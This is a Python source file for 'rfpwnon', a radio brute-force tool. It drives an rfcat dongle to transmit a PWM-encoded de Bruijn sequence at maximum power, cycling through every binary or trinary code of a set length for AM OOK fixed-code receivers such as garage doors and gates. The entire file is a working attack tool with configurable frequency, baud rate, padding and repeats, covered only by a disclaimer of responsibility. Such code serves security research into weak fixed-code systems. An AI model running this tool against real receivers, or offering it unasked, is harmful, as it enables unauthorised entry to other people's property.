#!/usr/bin/env python

import sys
from rflib import *
from struct import *
import argparse
import pwnlib
import bitstring

#rfpwnon.py was written by LegacySecurityGroup.com and is
#loosely based off AMOOKTransmit.py by www.andrewmohawk.com.
#This script may be updated from time to time,
#please check www.LegacySecurityGroup.com
#for updates or to report bugs.
#We assume no responsibility for your use of this script.
#It is up to you to use this script both ethically and legally.

#parser and help
parser = argparse.ArgumentParser(description='Application to use a rfcat compatible device to brute force a particular AM OOK or raw binary signal.',version="rfpwnon v-0.7")
parser.add_argument('-f', action="store", default="915000000", dest="baseFreq",help='Specify the target frequency to transmit on, default is 915000000.)',type=int)
parser.add_argument('-b', action="store", dest="baudRate",default=2000,help='Specify the baudrate of the signal, default is 2000.',type=int)
parser.add_argument('-l', action="store", dest="binLength",default=6,help='Specify the binary length of the signal to brute force.  By default this is the binary length before pwm encoding.  When the flag --raw is set this is the binary length of the pwm encoded signal.',type=int)
parser.add_argument('-r', action="store", dest="repeatTimes",default=1,help='Specify the number of times to repeat the signal.  By default this is set to 1 and uses the de bruijn sequence for speed.  When set greater than one the script sends each possible permutation of the signal individually and takes much longer to complete.  For some applications the signal is required to be sent multiple times.',type=int)
parser.add_argument('--keys', action="store_true",help='Displays the values being transmitted in binary, hex, and decimal both before and after pwm encoding.')
parser.add_argument('-p', action="store", dest="pPad",default=False,help='Specify your own binary padding to be attached before the brute forced binary.',type=str)
parser.add_argument('-t', action="store", dest="tPad",default=False,help='Specify your own binary padding to be attached after the brute forced binary.',type=str)
parser.add_argument('--raw', action="store_true",help='This flag disables the script from performing the pwm encoding of the binary signal.  When set you must specify the full pwm encoded binary length using -l.')
parser.add_argument('--tri', action="store_true",help='This flag sets up the script to brute force a trinary signal.')
results = parser.parse_args()

#define what a 0 or a 1 represents after pwm encoding is applied, or even a 2 if trinary!

#set normal pwm signal
zeropwm="1110"
onepwm="1000"
brutechar="01"
#other possibilities include but not limited to
#zeropwm="1110"
#onepwm="1100"
#zeropwm="11100"
#onepwm="11000"
#zeropwm="11100"
#onepwm="1000"

#set trinary pwm signal
if results.tri:
    zeropwm="10001000"
    onepwm="11101110"
    twopwm="10001110"
    brutechar="012"
    #other possibilities include but not limited to
    #zeropwm="100000000100000000"
    #onepwm="111111110100000000"
    #twopwm="111111110111111110"

#handle pwm encoding
def convertOOK(key):
    pwm_str_key = ""
    for k in key:
        x = "*"
        if(k == "0"):
            x = zeropwm
        if(k == "1"):
            x = onepwm
        if(k == "2"):
            x = twopwm
        pwm_str_key = pwm_str_key + x
        global pwmbin
        pwmbin = pwm_str_key
    key_ook = bitstring.BitArray(bin=pwm_str_key).tobytes()
    return key_ook;

#needs to be updated or removed
def printKeys():
    print ""
    print "---------------"
    print "Non PWM Signal"
    print "---------------"
    print "Binary:"
    print brutepackettemp
    print "Hex:"
    nonpwmhex = bitstring.BitArray(bin=brutepackettemp).tobytes()
    hexkey = ''.join(x.encode('hex') for x in nonpwmhex)
    print ':'.join(x.encode('hex') for x in nonpwmhex)
    print "Decimal:"
    decimalkey = int(hexkey, 16)
    print str(decimalkey)
    print ""
    if(results.raw is not True):
        print "------------------"
        print "PWM Encoded Signal"
        print "------------------"
        hexkeypwm = ''.join(x.encode('hex') for x in key_packed)
        print "Binary:"
        print pwmbin
        print "Hex:"
        print ':'.join(x.encode('hex') for x in key_packed)
        print "Decimal:"
        decimalkeypwm = int(hexkeypwm, 16)
        print str(decimalkeypwm)

#set variables and configure rfcat
binL = results.binLength
freq = results.baseFreq
baudRate = results.baudRate
d = RfCat()

def ConfigureD(d):
    d.setMdmModulation(MOD_ASK_OOK)
    d.setFreq(freq)
    d.setMdmSyncMode(0)
    d.setMdmDRate(baudRate)
    d.setMaxPower()

brute = ''
fullbrute = ''
ConfigureD(d)

#print "rfcat Config:"
#print d.reprRadioConfig()

#where the magic happens
print "Generating de bruijn sequence..."
tail = "0"
debruijn = pwnlib.util.cyclic.cyclic(alphabet=brutechar, n =binL)
for x in range(0, binL):
    looptail = ''.join(tail)
    fullbrute = debruijn+looptail
    tail = tail +"0"
print ""
print 'Brute Forcing Frequency: %s' % freq

if(results.pPad is not False):
    print ""
    print "Padding before binary:"
    print results.pPad
if(results.tPad is not False):
    print ""
    print "Padding after binary:"
    print results.tPad

#show the magic
print ""
print "De Bruijn Sequence:"
print fullbrute

brutepacket = fullbrute

brutelength = len(fullbrute)
startn = 0
endy=512
brutepackettemp = ""
adder=512
if results.tri:
    endy=128
    adder=128
if(results.repeatTimes >= 2) or (results.pPad is not False) or (results.tPad is not False):
    adder = 1
    endy = binL
    
#transmit
while(startn < brutelength):
    for i in range(0,results.repeatTimes):
        try:
            brutepackettemp = brutepacket[startn:endy]
            if len(brutepackettemp) < binL:
                continue

            #pad if specified
            if(results.pPad is not False):
                brutepackettemp = results.pPad + brutepackettemp
            if(results.tPad is not False):
                brutepackettemp = brutepackettemp + results.tPad

            if results.raw:
                key_packed = bitstring.BitArray(bin=brutepackettemp).tobytes()
            else:
                key_packed = convertOOK(brutepackettemp)

            print ""
            print "Transmitting..."
            d.makePktFLEN(len(key_packed))
            d.RFxmit(key_packed)

            if(results.keys):
                printKeys()
            else:
                if(results.raw):
                    print "Raw binary:"
                    print brutepackettemp
                    continue
                print "Binary before pwm encoding:"
                print brutepackettemp
                print "Binary after pwm encoding:"
                print pwmbin

        except Exception, e:
            print "Lost communication to USB device.. waiting 3 seconds, then retrying."
            time.sleep(3)
            ConfigureD(d)

            if(results.repeatTimes == 1):
                if(startn >= adder):
                    startn = startn - adder
                    endy = endy - adder
            elif(results.repeatTimes >= 2):
                if(startn >= 1):
                    startn = startn - 1
                    endy = endy - 1

    if(results.repeatTimes >= 2) or (results.pPad is not False) or (results.tPad is not False):
        startn = startn + adder
        endy = endy + adder
    else:
        startn = startn + adder - binL
        endy = endy + adder - binL

print ""
print "Done."
d.setModeIDLE()

